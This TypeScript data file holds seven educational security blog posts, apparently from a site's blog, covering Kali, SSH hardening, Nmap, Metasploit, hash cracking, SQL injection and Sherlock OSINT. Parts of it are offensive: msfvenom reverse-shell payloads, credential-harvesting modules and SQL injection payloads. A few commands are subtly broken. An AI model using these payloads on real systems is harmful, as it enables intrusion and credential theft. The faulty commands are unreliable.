export interface BlogPost {
  id: string;
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  category: string;
  tags: string[];
  date: string;
  readTime: string;
  author: string;
}

export const blogPosts: BlogPost[] = [
  {
    id: '1',
    slug: 'kali-linux-penetration-testing',
    title: 'Kali Linux: The Ultimate Penetration Testing Distribution',
    excerpt: 'Comprehensive guide to Kali Linux, the industry-standard penetration testing distribution. Learn installation, configuration, and essential tools for ethical hacking.',
    content: `# Kali Linux: The Ultimate Penetration Testing Distribution

Kali Linux is the world's leading penetration testing distribution, used by security professionals, ethical hackers, and cybersecurity researchers worldwide. This powerful platform comes pre-installed with over 600 penetration testing tools.

## Why Choose Kali Linux?

### Pre-Installed Tools
Kali Linux comes with a comprehensive suite of security tools:
- **Nmap** - Network discovery and security auditing
- **Metasploit Framework** - Exploit development and testing
- **Burp Suite** - Web application security testing
- **Aircrack-ng** - Wireless network security testing
- **John the Ripper** - Password cracking
- **Wireshark** - Network protocol analyzer

### Key Benefits
- Regular updates with latest security tools
- Designed for legitimate security testing
- Comprehensive documentation and community support
- Multiple installation options (bare metal, virtual, cloud)

## Installation and Setup

### System Requirements
- **RAM**: 1GB minimum (2GB recommended)
- **Storage**: 20GB minimum
- **Processor**: x64 or ARM architecture

### Installation Methods

#### 1. Full Installation
\`\`\`bash
# Download ISO from official website
# Create bootable USB drive using dd
dd if=kali-linux-2023.4-vmware-amd64.7z of=/dev/sdX bs=4M
# Boot from USB and follow installer
\`\`\`

#### 2. Virtual Machine
Recommended for beginners:
- Download VMware/VirtualBox images
- Assign adequate resources
- Take regular snapshots for testing

### Initial Configuration

#### Update System
\`\`\`bash
sudo apt update && sudo apt upgrade -y
sudo apt dist-upgrade -y
\`\`\`

#### Install Additional Tools
\`\`\`bash
# Install custom tools
sudo apt install custom-tool1 custom-tool2

# Update Metasploit
sudo msfupdate
\`\`\`

## Essential Kali Tools for Beginners

### 1. Nmap (Network Scanner)
\`\`\`bash
# Basic port scan
nmap target.com

# Comprehensive scan
nmap -sS -sV -O -A target.com

# Scan specific ports
nmap -p 22,80,443 target.com

# Nmap Scripting Engine
nmap --script vuln target.com
\`\`\`

### 2. Metasploit Framework
\`\`\`bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms08_067_netapi

# Set target
set RHOSTS target.com

# Execute
exploit
\`\`\`

### 3. Burp Suite (Web Testing)
- Intercept HTTP requests
- Scan for vulnerabilities
- Repeater for testing requests
- Intruder for automated testing

### 4. Aircrack-ng (Wireless Testing)
\`\`\`bash
# Put interface in monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon

# Crack WPA/WEP passwords
aircrack-ng -w wordlist.cap
\`\`\`

## Legal and Ethical Considerations

### Authorization Required
- **Never test systems without explicit permission**
- Obtain written authorization before penetration testing
- Respect the scope and limitations agreed upon

### Responsible Disclosure
- Report vulnerabilities to system owners responsibly
- Give reasonable time for patches before public disclosure
- Follow coordinated vulnerability disclosure practices

### Educational Use
- Practice in controlled environments
- Use dedicated lab networks
- Set up personal virtual networks for learning

Kali Linux is a powerful platform that, when used ethically, can significantly enhance your cybersecurity skills and capabilities.`,
    category: 'Penetration Testing',
    tags: ['Kali Linux', 'Penetration Testing', 'Ethical Hacking', 'Security Tools'],
    date: '2025-11-12',
    readTime: '12 min read',
    author: 'Penetration Tester'
  },
  {
    id: '2',
    slug: 'ssh-security-hardening',
    title: 'Secure Your SSH: Essential Security Measures',
    excerpt: 'Learn how to properly configure and secure SSH servers. Master key management, authentication methods, and hardening techniques.',
    content: `# Secure Your SSH: Essential Security Measures

SSH (Secure Shell) is one of the most critical services to secure properly. With over 2.3 million SSH servers exposed to the internet, proper configuration is essential for network security.

## Why SSH Security Matters

SSH provides remote access to servers and systems, making it a prime target for attackers. Common threats include:
- Brute force attacks
- Credential stuffing
- Key-based attacks
- Man-in-the-middle attacks

## Essential SSH Hardening Steps

### 1. Disable Password Authentication

\`\`\`bash
# Edit SSH configuration
sudo nano /etc/ssh/sshd_config

# Disable password authentication
PasswordAuthentication no
PubkeyAuthentication yes
ChallengeResponseAuthentication no

# Restart SSH service
sudo systemctl restart sshd
\`\`\`

### 2. Use Strong SSH Keys

\`\`\`bash
# Generate 4096-bit RSA key
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_secure

# Or use ed25519 (recommended)
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519

# Add public key to server
ssh-copy-id user@server.com
\`\`\`

### 3. Configure SSH Keys Properly

\`\`\`bash
# Create authorized_keys file with proper permissions
mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Add public key (one per line)
echo "ssh-ed25519 AAAA... user@client" >> ~/.ssh/authorized_keys
\`\`\`

### 4. Restrict SSH Access

\`\`\`bash
# Limit to specific users
AllowUsers admin security-team

# Restrict by IP address
# /etc/hosts.allow
sshd: 192.168.1.0/24
# /etc/hosts.deny
sshd: ALL

# Or use firewall rules
sudo ufw allow from 192.168.1.0/24 to any port 22
\`\`\`

### 5. Change Default Port

\`\`\`bash
# Change SSH port
Port 2222

# Update firewall
sudo ufw allow 2222/tcp
\`\`\`

## Advanced Security Configuration

### Use SSH Config File

\`\`\`bash
# ~/.ssh/config
Host server1
    HostName server1.example.com
    User admin
    Port 2222
    IdentityFile ~/.ssh/id_ed25519
    ForwardAgent no
    ServerAliveInterval 300
    ServerAliveCountMax 2
\`\`\`

### Implement 2FA with Google Authenticator

\`\`\`bash
# Install google-authenticator
sudo apt install libpam-google-authenticator

# Run setup
google-authenticator

# Edit PAM configuration
sudo nano /etc/pam.d/sshd
# Add: auth required pam_google_authenticator.so

# Update SSH config
sudo nano /etc/ssh/sshd_config
# Add:
AuthenticationMethods publickey,keyboard-interactive
ChallengeResponseAuthentication yes

# Restart SSH
sudo systemctl restart sshd
\`\`\`

SSH security is fundamental to maintaining secure remote access. Implement these measures systematically and regularly audit your SSH configurations to ensure they remain secure against evolving threats.

Remember: **Security is not a one-time setup but an ongoing process**.`,
    category: 'Network Security',
    tags: ['SSH', 'Network Security', 'Authentication', 'Hardening'],
    date: '2025-11-10',
    readTime: '15 min read',
    author: 'Network Security Engineer'
  },
  {
    id: '3',
    slug: 'nmap-network-scanning-mastery',
    title: 'Network Scanning with Nmap: Techniques and Best Practices',
    excerpt: 'Master Nmap network scanning techniques. Learn port scanning, service detection, OS fingerprinting, and advanced scanning methods for security professionals.',
    content: `# Network Scanning with Nmap: Techniques and Best Practices

Nmap (Network Mapper) is the industry standard for network discovery and security auditing. Used by both security professionals and malicious actors, understanding Nmap is essential for network security.

## Nmap Fundamentals

### What is Nmap?
Nmap is a free and open-source network scanner designed to:
- Discover hosts and services on a network
- Identify operating systems and versions
- Detect security policies and firewalls
- Map network topology

### Key Features
- **Port Scanning**: Identify open ports and services
- **Service Detection**: Determine version and type of services
- **OS Fingerprinting**: Detect operating system characteristics
- **Script Engine**: Execute custom scripts for advanced testing

## Installation and Basic Usage

### Installing Nmap

\`\`\`bash
# Ubuntu/Debian
sudo apt install nmap

# CentOS/RHEL
sudo yum install nmap

# Kali Linux (pre-installed)
nmap --version
\`\`\`

### Basic Scanning

\`\`\`bash
# Single target scan
nmap target.com

# IP address scan
nmap 192.168.1.100

# Scan multiple targets
nmap target1.com target2.com target3.com

# Scan from file
nmap -iL targets.txt
\`\`\`

## Port Scanning Techniques

### TCP Connect Scan (-sT)
\`\`\`bash
# Full TCP connection to each port
nmap -sT target.com
\`\`\`
**Pros**: Reliable, no special privileges needed
**Cons**: Easily detectable, slower

### SYN Stealth Scan (-sS)
\`\`\`bash
# Half-open scan (sends SYN, analyzes response)
nmap -sS target.com
\`\`\`
**Pros**: Faster, less detectable
**Cons**: Requires root privileges

### UDP Scan (-sU)
\`\`\`bash
# Scan UDP ports (often ignored)
nmap -sU target.com

# Combined TCP and UDP
nmap -sS -sU target.com
\`\`\`

## Service and Version Detection

### Basic Service Detection (-sV)
\`\`\`bash
# Detect service versions
nmap -sV target.com

# Combine with aggressive timing
nmap -sV -T4 target.com
\`\`\`

### Advanced Version Detection
\`\`\`bash
# Enable all version detection features
nmap -sV --version-intensity 9 target.com

# Detect operating system
nmap -O target.com

# Combine OS detection with service detection
nmap -sV -O target.com
\`\`\`

## Scripting Engine (NSE)

### Using Nmap Scripts

\`\`\`bash
# Default safe scripts
nmap --script default target.com

# Specific script category
nmap --script vuln target.com

# Individual scripts
nmap --script http-title,http-headers target.com
\`\`\`

### Common Script Categories

#### Vulnerability Detection
\`\`\`bash
# Check for common vulnerabilities
nmap --script vuln target.com

# Check SSL/TLS
nmap --script ssl-enum-ciphers -p 443 target.com

# HTTP security headers
nmap --script http-security-headers target.com
\`\`\`

## Best Practices and Legal Considerations

### Ethical Scanning Guidelines

1. **Always get authorization** before scanning systems
2. **Document the scope** of your authorized testing
3. **Use appropriate timing** to avoid overwhelming targets
4. **Respect rate limits** and system resources
5. **Report findings** responsibly to system owners

**Remember**: With great power comes great responsibility. Always use Nmap ethically and legally.`,
    category: 'Penetration Testing',
    tags: ['Nmap', 'Network Scanning', 'Port Scanning', 'Security Assessment'],
    date: '2025-11-08',
    readTime: '18 min read',
    author: 'Network Security Specialist'
  },
  {
    id: '4',
    slug: 'metasploit-framework-mastery',
    title: 'Metasploit: Mastering the Metasploit Framework',
    excerpt: 'Comprehensive guide to Metasploit Framework. Learn exploit development, payload generation, post-exploitation techniques, and professional penetration testing methodologies.',
    content: `# Metasploit: Mastering the Metasploit Framework

Metasploit Framework is the world's most widely used penetration testing framework, providing a comprehensive platform for developing, testing, and executing exploits.

## Introduction to Metasploit

### What is Metasploit?
Metasploit Framework is an open-source security tool that provides:
- **Exploit Development Environment**
- **Payload Generation**
- **Post-Exploitation Modules**
- **Evasion Techniques**
- **Automated Testing Capabilities**

### Architecture Overview
- **msfconsole**: Main command-line interface
- **msfvenom**: Payload generator
- **msfdb**: Database for storing scan results
- **msfupdate**: Framework updater

## Getting Started

### Installation

\`\`\`bash
# Kali Linux (pre-installed)
msfconsole

# Ubuntu/Debian
sudo apt install metasploit-framework

# Manual installation
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install
\`\`\`

### Starting Metasploit
\`\`\`bash
# Launch msfconsole
msfconsole

# Initialize database
msfdb init

# Update framework
sudo msfupdate
\`\`\`

## Basic Console Usage

### Getting Help
\`\`\`bash
# General help
help

# Command-specific help
help show

# Module information
info exploit/windows/smb/ms08_067_netapi

# Search for modules
search type:exploit platform:windows
\`\`\`

## Exploit Development and Usage

### Finding Exploits
\`\`\`bash
# Search by keyword
search name:apache

# Search by platform
search platform:linux

# Search by type
search type:exploit

# Combine criteria
search type:exploit platform:windows author:jduck
\`\`\`

### Using Exploits
\`\`\`bash
# Select exploit
use exploit/windows/smb/ms08_067_netapi

# Set target IP
set RHOSTS 192.168.1.100

# Set target port (if different from default)
set RPORT 445

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Set listener IP
set LHOST 192.168.1.50

# Set listener port
set LPORT 4444

# Check if target is vulnerable
check

# Execute exploit
exploit
\`\`\`

## Payload Generation with msfvenom

### Basic Payload Creation
\`\`\`bash
# Windows reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Linux reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf

# Mac reverse TCP
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o payload.macho
\`\`\`

### Web Payloads
\`\`\`bash
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp
\`\`\`

## Post-Exploitation Techniques

### Information Gathering
\`\`\`bash
# System information gathering
use post/windows/gather/checkvm

use post/windows/gather/enum_logged_on_users

use post/windows/gather/enum_services

use post/windows/gather/enum_patches
\`\`\`

### Credential Harvesting
\`\`\`bash
# Hashdump (requires admin/system privileges)
use post/windows/gather/smart_hashdump

# SAM database extraction
use post/windows/gather/credentials/sam

# Browser credential extraction
use post/windows/gather/credentials/chrome
\`\`\`

## Best Practices and Ethical Guidelines

### Professional Standards
1. **Always obtain written authorization**
2. **Document all testing activities**
3. **Respect system availability**
4. **Report vulnerabilities responsibly**
5. **Follow agreed-upon scope**

**Remember**: Use Metasploit responsibly and only for authorized security testing. The knowledge and tools should always be used to improve security, not compromise it.`,
    category: 'Penetration Testing',
    tags: ['Metasploit', 'Exploitation', 'Payloads', 'Penetration Testing'],
    date: '2025-11-06',
    readTime: '20 min read',
    author: 'Exploitation Specialist'
  },
  {
    id: '5',
    slug: 'password-security-hash-cracking',
    title: 'Password Security: Best Practices and Hash Cracking',
    excerpt: 'Learn password security fundamentals, hashing algorithms, and ethical password cracking techniques for security assessments.',
    content: `# Password Security: Best Practices and Hash Cracking

Password security is fundamental to cybersecurity. Understanding password storage, hashing algorithms, and cracking techniques is essential for security professionals.

## Password Security Fundamentals

### Why Password Security Matters
Passwords are the most common authentication method:
- Billions of passwords compromised annually
- Users reuse passwords across services
- Weak passwords are easily guessable
- Password attacks are automated and widespread

### Password Attack Types
1. **Brute Force**: Trying all possible combinations
2. **Dictionary Attacks**: Using word lists and variations
3. **Rainbow Tables**: Pre-computed hash databases
4. **Social Engineering**: Tricking users into revealing passwords
5. **Credential Stuffing**: Using leaked passwords from other breaches

## Password Hashing Algorithms

### Weak Hashing Algorithms

#### MD5 (Cryptographically Broken)
\`\`\`bash
# MD5 hash generation
echo -n "password123" | md5sum
# Output: 482c811da5d5b4bc6d497ffa98491e38
\`\`\`

**Problems:**
- Fast computation (good for GPU attacks)
- Vulnerable to collisions
- No salt support in original design

#### SHA-1 (Deprecated for Security)
\`\`\`bash
# SHA-1 hash generation
echo -n "password123" | sha1sum
# Output: 3c0ce44f411e05cdf6c5a2ce3f0e7ad7bb7e9e03
\`\`\`

**Problems:**
- Still too fast for password hashing
- Theoretical collisions practical in 2017
- Deprecated by NIST

### Modern Password Hashing

#### bcrypt (Recommended)
\`\`\`python
import bcrypt

# Hash password
password = b"user_password"
hashed = bcrypt.hashpw(password, bcrypt.gensalt())
print(hashed.decode())

# Verify password
if bcrypt.checkpw(password, hashed):
    print("Password correct")
\`\`\`

**Advantages:**
- Built-in salt generation
- Adjustable work factor (cost parameter)
- Memory-hard function (resistant to ASIC/GPU)

#### Argon2 (Winner of Password Hashing Competition)
\`\`\`python
from argon2 import PasswordHasher

ph = PasswordHasher()
hash = ph.hash("user_password")
print(hash)

# Verify
try:
    ph.verify(hash, "user_password")
    print("Password correct")
except:
    print("Password incorrect")
\`\`\`

**Advantages:**
- Winner of 2015 Password Hashing Competition
- Memory-hard and parallelizable
- Side-channel resistant

## Hash Cracking Techniques

### Using Hashcat for Password Cracking

#### Installation and Setup
\`\`\`bash
# Install Hashcat
sudo apt install hashcat

# Install GPU drivers (for faster cracking)
sudo apt install nvidia-driver-470  # NVIDIA
sudo apt install mesa-opencl-icd    # AMD/Intel
\`\`\`

#### Basic Hashcat Usage
\`\`\`bash
# List available modes
hashcat --help | grep -A 100 "Hash-Mode"

# Crack MD5 hash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 3 "?a?a?a?a?a?a?a?a"

# Crack bcrypt hash (slower)
echo "\$2b\$10\$uO.cRj3fUJBud.7d7F3F.tJbZ7xD9dC7dT3O3R6S5B7F3D8E" | hashcat -m 3200 -a 3 ?a?a?a?a?a?a
\`\`\`

#### Dictionary Attacks
\`\`\`bash
# Use wordlist
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Use multiple wordlists
hashcat -m 0 -a 0 hashes.txt wordlist1.txt wordlist2.txt

# Use rules with wordlist
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
\`\`\`

#### Rule-Based Attacks
\`\`\`bash
# Apply transformation rules
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Create custom rule
cat custom.rule
$1
$2
$3
$\!

# Use custom rule
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r custom.rule
\`\`\`

### Using John the Ripper

#### Installation and Basic Usage
\`\`\`bash
# Install John
sudo apt install john

# Check hash format
john --list=formats

# Basic crack
john hashes.txt

# Use wordlist
john --wordlist=wordlist.txt hashes.txt

# Use rules
john --wordlist=wordlist.txt --rules=wordlist.rules hashes.txt
\`\`\`

## Best Practices for Security Professionals

### Ethical Hash Cracking
1. **Always obtain authorization** before cracking passwords
2. **Use only for legitimate security testing**
3. **Respect privacy and confidentiality**
4. **Report findings responsibly**
5. **Use secure methods for password storage**

### Defensive Measures
\`\`\`python
# Secure password hashing example
import bcrypt
import secrets

def create_user(username, password):
    """Create user with properly hashed password"""
    # Generate random salt
    salt = bcrypt.gensalt()
    
    # Hash password with salt
    hashed_password = bcrypt.hashpw(password.encode(), salt)
    
    # Store in database
    store_user(username, hashed_password)
    
    return True

def verify_password(stored_hash, provided_password):
    """Verify password against stored hash"""
    return bcrypt.checkpw(provided_password.encode(), stored_hash)
\`\`\`

## Conclusion

Password security is a critical component of cybersecurity. Understanding both offensive (cracking) and defensive (protection) techniques is essential for security professionals.

**Key Takeaways:**
- Always use modern hashing algorithms (bcrypt, Argon2)
- Implement strong password policies
- Use multi-factor authentication where possible
- Regularly audit password security
- Educate users about password best practices

Remember: **Use this knowledge responsibly** to improve security, not to compromise systems.`,
    category: 'Web Security',
    tags: ['Password Security', 'Hashing', 'Hashcat', 'John the Ripper'],
    date: '2025-11-04',
    readTime: '16 min read',
    author: 'Security Specialist'
  },
  {
    id: '6',
    slug: 'web-application-security-sql-injection',
    title: 'Web Application Security: SQL Injection and Protection',
    excerpt: 'Comprehensive guide to SQL injection vulnerabilities, detection techniques, and protection methods for web applications.',
    content: `# Web Application Security: SQL Injection and Protection

SQL injection remains one of the most dangerous web application vulnerabilities, affecting millions of applications worldwide. Understanding both attack and defense is crucial for web security professionals.

## Understanding SQL Injection

### What is SQL Injection?
SQL injection occurs when attackers can insert malicious SQL code into application queries, potentially:
- Bypassing authentication
- Reading sensitive data
- Modifying or deleting data
- Executing administrative operations
- Taking complete control of the database server

### Vulnerable Code Examples

#### Python (Vulnerable)
\`\`\`python
# VULNERABLE - Direct string concatenation
username = request.form['username']
password = request.form['password']

query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
\`\`\`

#### PHP (Vulnerable)
\`\`\`php
<?php
// VULNERABLE - Direct concatenation
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($connection, $query);
?>
\`\`\`

#### Java (Vulnerable)
\`\`\`java
// VULNERABLE - String concatenation
String username = request.getParameter("username");
String password = request.getParameter("password");

String query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
\`\`\`

## SQL Injection Attack Types

### 1. Union-Based SQL Injection
\`\`\`sql
-- Original query
SELECT id, name, email FROM users WHERE id = 1

-- Union injection
1' UNION SELECT password, username, email FROM admin_users --

-- Result
SELECT id, name, email FROM users WHERE id = 1' UNION SELECT password, username, email FROM admin_users --
\`\`\`

### 2. Boolean-Based Blind SQL Injection
\`\`\`sql
-- Test if admin exists
' OR (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --

-- Extract data character by character
' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 64 --
\`\`\`

### 3. Time-Based Blind SQL Injection
\`\`\`sql
-- Use sleep() to infer data
' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5)) > 0 --

-- Time-based extraction
' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64,SLEEP(5),0) --
\`\`\`

## Tools and Techniques for Testing

### Manual Testing

#### Test Payloads
\`\`\`sql
-- Basic test
1' OR '1'='1

-- Comment out rest of query
1' OR '1'='1' -- 

-- Different comment syntax
1' OR '1'='1' /*

-- Boolean-based test
1' AND '1'='1

-- Numeric injection
1 OR 1=1
\`\`\`

#### Testing Parameters
\`\`\`sql
-- Test different parameters
?id=1' -- (GET parameter)
?id=1' OR '1'='1' -- (Union-based)
?id=1' AND SLEEP(5) -- (Time-based)

-- Test POST parameters
username=admin'--
password=anything

-- Test HTTP headers
Cookie: session_id=abc' UNION SELECT * FROM users--
\`\`\`

### Automated Tools

#### SQLMap Installation and Usage
\`\`\`bash
# Install SQLMap
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# Basic scan
python3 sqlmap.py -u "http://target.com/login.php" --data="username=test&password=test"

# Advanced scan
python3 sqlmap.py -u "http://target.com/product.php?id=1" --batch --crawl=2

# Use Tor for anonymity
python3 sqlmap.py -u "http://target.com/product.php?id=1" --tor --check-tor

# Specific database detection
python3 sqlmap.py -u "http://target.com/product.php?id=1" --dbms=mysql --batch
\`\`\`

## Defensive Programming

### Parameterized Queries (Prepared Statements)

#### Python
\`\`\`python
import sqlite3

# SECURE - Using parameterized queries
username = request.form['username']
password = request.form['password']

query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))

# Using ORM (recommended)
from sqlalchemy.orm import sessionmaker

Session = sessionmaker(bind=engine)
session = Session()

user = session.query(User).filter_by(
    username=username,
    password=password_hash(password)
).first()
\`\`\`

#### PHP
\`\`\`php
<?php
// SECURE - Using prepared statements
$username = $_POST['username'];
$password = $_POST['password'];

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $hashed_password]);
$user = $stmt->fetch();

// Using PDO (recommended)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute([
    'username' => $username,
    'password' => $password_hash
]);
?>
\`\`\`

#### Java
\`\`\`java
// SECURE - Using PreparedStatement
String username = request.getParameter("username");
String password = request.getParameter("password");

String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
stmt.setString(2, password);

ResultSet rs = stmt.executeQuery();

// Using JPA (recommended)
TypedQuery<User> query = em.createQuery(
    "SELECT u FROM User u WHERE u.username = :username AND u.password = :password",
    User.class
);
query.setParameter("username", username);
query.setParameter("password", hashedPassword);
\`\`\`

## Best Practices and Security Measures

### Input Validation
\`\`\`python
import re

def validate_username(username):
    """Whitelist validation for username"""
    # Allow only alphanumeric characters, 3-20 characters
    pattern = r'^[a-zA-Z0-9]{3,20}$'
    
    if re.match(pattern, username):
        return True
    return False

def validate_email(email):
    """Email validation"""
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    if re.match(pattern, email):
        return True
    return False
\`\`\`

### Database Security
\`\`\`sql
-- Create application user with minimal permissions
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'localhost';

-- Deny dangerous operations
REVOKE ALL PRIVILEGES ON *.* FROM 'app_user'@'localhost';

-- Flush privileges
FLUSH PRIVILEGES;
\`\`\`

### Web Application Firewall (WAF)
\`\`\`apache
# Apache mod_security example
<LocationMatch "/login">
    SecRule ARGS "@detectSQLi" 
        "id:'1001',
         phase:'2',
         deny,
         msg:'SQL Injection Attack Detected'"
</LocationMatch>
\`\`\`

## Conclusion

Web application security requires a multi-layered approach. Understanding SQL injection vulnerabilities, their impact, and proper protection methods is crucial for maintaining secure applications.

Key takeaways:
- **Always use parameterized queries** - never concatenate user input
- **Implement defense in depth** - validation, sanitization, and proper database permissions  
- **Test regularly** - automated and manual security testing
- **Stay updated** - keep frameworks and libraries current
- **Educate teams** - ensure all developers understand secure coding practices

Remember: **Security is not a feature, it's a requirement**.`,
    category: 'Web Security',
    tags: ['SQL Injection', 'Web Security', 'Database Security', 'Prevention'],
    date: '2025-11-01',
    readTime: '22 min read',
    author: 'Web Security Specialist'
  },
  {
  id: '7',
  slug: 'osint-find-social-media-accounts-with-sherlock',
  title: 'OSINT Guide: Finding Social Media Accounts Using Sherlock',
  excerpt: 'Learn how to identify social media accounts across hundreds of platforms using the Sherlock OSINT tool for Python.',
  content: `# OSINT Guide: Finding Social Media Accounts Using Sherlock

Sherlock is one of the most widely used OSINT tools for identifying social media profiles linked to a username. Whether you're working in cybersecurity, investigations, or digital research, Sherlock provides a fast and automated way to check hundreds of platforms for public accounts.

## What Is Sherlock?

Sherlock is an open-source Python 3 tool that scans a large list of social media platforms and websites for accounts matching a specific username. It is frequently used for:

- Digital investigations  
- Identity mapping  
- Brand protection and monitoring  
- Cybersecurity OSINT workflows  
- Threat intelligence research  

Sherlock uses *only publicly available information*, making it a safe and legal OSINT tool when used responsibly.

---

# Installation

## Linux Installation

The following works on Kali Linux, Ubuntu, Debian, and other distributions:

\`\`\`bash
sudo apt update
sudo apt install git python3 python3-pip -y

git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
python3 -m pip install -r requirements.txt
\`\`\`

Sherlock is now ready for use.

---

## Windows (PowerShell) Installation

### 1. Install Python  
Download Python from the official website and ensure **"Add Python to PATH"** is enabled.

### 2. Install Sherlock  
Open PowerShell:

\`\`\`powershell
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
python -m pip install -r requirements.txt
\`\`\`

---

# Usage

## Basic Username Search

\`\`\`bash
python3 sherlock.py username
\`\`\`

Example:

\`\`\`bash
python3 sherlock.py johnsmith
\`\`\`

Sherlock will scan multiple platforms and list any public profiles found.

---

## Saving Results to a File

\`\`\`bash
python3 sherlock.py johnsmith --output johnsmith_results.txt
\`\`\`

This stores all findings in a text file for later review.

---

## Searching Multiple Usernames

\`\`\`bash
python3 sherlock.py user1 user2 user3
\`\`\`

---

## Using a Wordlist

\`\`\`bash
python3 sherlock.py -l usernames.txt --output output.txt
\`\`\`

---

# Automation Examples

## Linux: Bash Script

Create a file named \`find_profiles.sh\`:

\`\`\`bash
#!/bin/bash

USERNAME=$1
python3 sherlock.py "$USERNAME" --output "$USERNAME.txt"

echo "Results saved to $USERNAME.txt"
\`\`\`

Run:

\`\`\`bash
chmod +x find_profiles.sh
./find_profiles.sh username
\`\`\`

---

## Windows: PowerShell Script

Create \`find-profiles.ps1\`:

\`\`\`powershell
param([string]$username)

python sherlock.py $username --output "$username.txt"
Write-Host "Results saved to $username.txt"
\`\`\`

Run:

\`\`\`powershell
.\find-profiles.ps1 username
\`\`\`

---

# Ethical Use

Even though Sherlock uses public data, it must be applied responsibly. Always:

- Respect privacy laws and platform terms  
- Avoid targeting individuals without valid justification  
- Use the tool for legitimate OSINT, cybersecurity, or investigative research  

Remember: OSINT should support security — not violate it.

---

# Conclusion

Sherlock is a powerful and lightweight OSINT tool for mapping social media presence based on usernames. With simple setup and broad platform support, it is a must-have in any cybersecurity or investigative toolkit.

**Key points:**

- Easy installation on Linux and Windows  
- Scans hundreds of platforms automatically  
- Supports automation through scripts  
- Only uses publicly available data  
- Ideal for cybersecurity, OSINT, and investigative work  

Sherlock provides fast, reliable insights into digital footprints — when used ethically and responsibly.
`,
  category: 'OSINT',
  tags: ['OSINT', 'Sherlock', 'Social Media Enumeration', 'Cybersecurity Tools'],
  date: '2025-11-16',
  readTime: '12 min read',
  author: 'Security Specialist'
}]